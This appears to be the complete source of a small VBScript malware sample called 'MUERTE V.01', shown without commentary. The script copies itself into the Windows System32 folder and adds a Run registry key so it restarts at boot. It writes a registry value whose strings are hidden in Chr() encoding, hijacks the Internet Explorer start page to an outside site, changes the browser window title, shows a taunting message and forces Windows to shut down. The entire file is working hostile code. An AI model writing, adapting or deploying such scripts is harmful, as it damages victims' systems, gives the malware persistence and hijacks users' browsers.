'«Ä»
ON ERROR RESUME NEXT
Dim MUERTEV01cmsgfdxidy
Dim MUERTEV01cborrfdxidy
Dim MUERTEV01ccolfdxidy
Dim zfdxidy
Dim MUERTEV01narfdxidy
Dim MUERTEV01difdxidy
Dim MUERTEV01valfdxidy
Dim MUERTEV01senfdxidy
Dim MUERTEV01tecfdxidy
Dim vtecfdxidy
Dim Cofdxidy
Set MUERTEV01wshfdxidy = CreateObject("WScript.Shell")
Set MUERTEV01fsofdxidy= CreateObject("scripting.filesystemobject")
MUERTEV01fsofdxidy.copyfile wscript.scriptfullname,"C:\Windows\System32\system32.vbs"
MUERTEV01wshfdxidy.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MuerteV01","wscript.exe C:\Windows\System32\system32.vbs %"
MUERTEV01wshfdxidy.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
msgbox "BYE HASTA NUNCA",16
MUERTEV01wshfdxidy.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.lubegoma.05c.net"
MUERTEV01wshfdxidy.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title","MUERTE V.01"
MUERTEV01wshfdxidy.run "C:\WINDOWS\RUNDLL32.EXE user.exe,ExitWindows"



